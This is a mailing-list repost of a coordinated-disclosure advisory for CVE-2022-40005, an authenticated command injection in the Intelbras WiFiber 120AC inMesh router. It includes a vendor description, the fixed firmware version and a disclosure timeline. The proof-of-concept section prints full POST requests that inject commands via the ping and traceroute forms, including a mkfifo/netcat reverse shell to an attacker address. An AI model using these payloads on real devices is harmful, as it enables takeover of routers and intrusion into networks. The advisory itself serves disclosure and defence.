---
title: Re: CyberDanube Security Research 20221009-0 | Authenticated Command Injection in Intelbras WiFiber 120AC inMesh
url: https://seclists.org/fulldisclosure/2022/Dec/13
source: Full Disclosure
date: 2022-12-14
fetch_date: 2025-10-04T01:28:43.783910
---

# Re: CyberDanube Security Research 20221009-0 | Authenticated Command Injection in Intelbras WiFiber 120AC inMesh

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](12)
[By Date](date.html#13)
[![Next](/images/right-icon-16x16.png)](14)

[![Previous](/images/left-icon-16x16.png)](12)
[By Thread](index.html#13)
[![Next](/images/right-icon-16x16.png)](14)

![](/shared/images/nst-icons.svg#search)

# Re: CyberDanube Security Research 20221009-0 | Authenticated Command Injection in Intelbras WiFiber 120AC inMesh

---

*From*: Thomas Weber <t.weber () cyberdanube com>
*Date*: Tue, 13 Dec 2022 17:59:41 +0100

---

```
CyberDanube Security Research 20221009-0
```

-------------------------------------------------------------------------------

```
               title| Authenticated Command Injection
             product| Intelbras WiFiber 120AC inMesh
  vulnerable version| 1.1-220216
       fixed version| 1-1-220826
          CVE number| CVE-2022-40005
              impact| High
            homepage| https://www.intelbras.com
               found| 2022-08-01
                  by| T. Weber (Office Vienna)
                    | CyberDanube Security Research
                    | Vienna | St. Pölten
                    |
                    | https://www.cyberdanube.com
```

-------------------------------------------------------------------------------

```
Vendor description
```

-------------------------------------------------------------------------------

```
"We are Intelbras. A company that for 45 years has been offering innovative
```

solutions in security, networks, communication and energy. Our dream
began to
come to life there in 1976, in the city of São José, having originated
from an

```
INspiration and a promising idea: to manufacture PABX centrals. During the
```

80's, we surprised the market with the launch of the first PABX
developed with
national technology, a product that showed everyone our innovative DNA.
The 90s

```
were marked by the consolidation of the company in the telecommunications
```

segment and we became leaders in the PABX and telephone terminals
segment. The

```
turn of the millennium represented the search for greater connection and
```

proximity to people, something that is in total harmony with our
philosophy to
this day. More consolidated in the market, in 2010 we opened 3
manufacturing

```
units, located in Santa Rita do Sapucaí/MG, Manaus/AM and São José/SC.
```

We reached our 45th birthday having reached a historic milestone: we
have been
a company listed on the B3 since February 2021. Our trajectory so far
has been
INnovative, INtelligent and INSpiring. We saw innovation, which is part
of our

```
DNA, increasingly present in our daily lives. And it was only possible to
```

write a story so full of achievements because employees, partners and
customers

```
were close and believed in us."

Source: https://www.intelbras.com/en/institutional/who-we-are

Vulnerable versions
```

-------------------------------------------------------------------------------

```
WiFiber 120AC inMesh / 1.1-220216

Vulnerability overview
```

-------------------------------------------------------------------------------

```
1) Authenticated Command Injection (CVE-2022-40005)
```

The web server of the device is prone to an authenticated command
injection.
It allows an attacker to gain full access to the underlying operating
system of
the device with all implications. If such a device is acting as key
device in
an industrial network, more extensive damage in the corresponding
network can

```
be done by an attacker.

Proof of Concept
```

-------------------------------------------------------------------------------

```
1) Authenticated Command Injection (CVE-2022-40005)
The web server is prone to an authenticated command injection via POST
parameters. The following proof-of-concept shows how to inject the command
"ls /" to the system which gets executed in the background:
```

===============================================================================

```
POST /boaform/formPing6 HTTP/1.1
Host: 192.168.3.147
```

User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:91.0) Gecko/20100101
Firefox/91.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8

```
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
Origin: http://192.168.3.147
Connection: close
Referer: http://192.168.3.147/ping6.asp
Upgrade-Insecure-Requests: 1
```

pingAddr=%3Bls+%2F%3B&wanif=65535&go=+Ir&submit-url=%2Fping6.asp&postSecurityFlag=39908
===============================================================================

```
The following commands can be used to open a reverse shell:

"rm -f /tmp/f"
"mkfifo /tmp/f"
"cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.3.138 8889 >/tmp/f"

Those commands were sent via a crafted POST request:
```

===============================================================================

```
POST /boaform/formTracert HTTP/1.1
Host: 192.168.3.147
```

User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:91.0) Gecko/20100101
Firefox/91.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8

```
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 255
Origin: http://192.168.3.147
Connection: close
Referer: http://192.168.3.147/tracert.asp
Upgrade-Insecure-Requests: 1
```

proto=0&traceAddr=%3Brm+-f+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+192.168.3.138+8889+%3E%2Ftmp%2Ff%3B&trys=3&timeout=5&datasize=56&dscp=0&maxhop=30&wanif=65535&go=+Ir&submit-url=%2Ftracert.asp&postSecurityFlag=29290
===============================================================================

```
The vulnerability was manually verified on an emulated device by using the
MEDUSA scalable firmware runtime (https://medusa.cyberdanube.com).

Solution
```

-------------------------------------------------------------------------------

```
Update to firmware version 1-1-220826.
```

<https://backend.intelbras.com/sites/default/files/2022-08/ONT_Wifiber_120_AC_Vers%C3%A3o_1-1-220826.zip>

```
Workaround
```

-------------------------------------------------------------------------------

```
None

Recommendation
```

-------------------------------------------------------------------------------

```
CyberDanube recommends Intelbras customers to upgrade the firmware to the
latest version available.

Contact Timeline
```

-------------------------------------------------------------------------------

```
2022-08-02: Contacting Intelbras via suporte () intelbras com br.
2022-08-03: Request from Intelbras to send the advisory to
csirt () intelbras com br; Sent the advisory to this address.
2022-08-30: Asked for status update; Vendor answered that the new firmware
```

            version has been released the day before. Set the
disclosure date

```
            to 2022-10-03 (60 days policy).
2022-10-03: Shifted disclosure date to 2022-10-09 due to sick colleagues.
2022-10-09: Coordinated disclosure of advisory.

Web: https://www.cyberdanube.com
Twitter: https://twitter.com/cyberdanube
Mail: research at cyberdanube dot com

EOF T. Weber / @2022

On 09.10.22 17:21, Thomas Weber wrote:
```

> ```
> CyberDanube Security Research 20221009-0
> ```
>
> -------------------------------------------------------------------------------
>
>
> ```
>                title| Authenticated Command Injection
>              product| Intelbras WiFiber 120AC inMesh
>  ...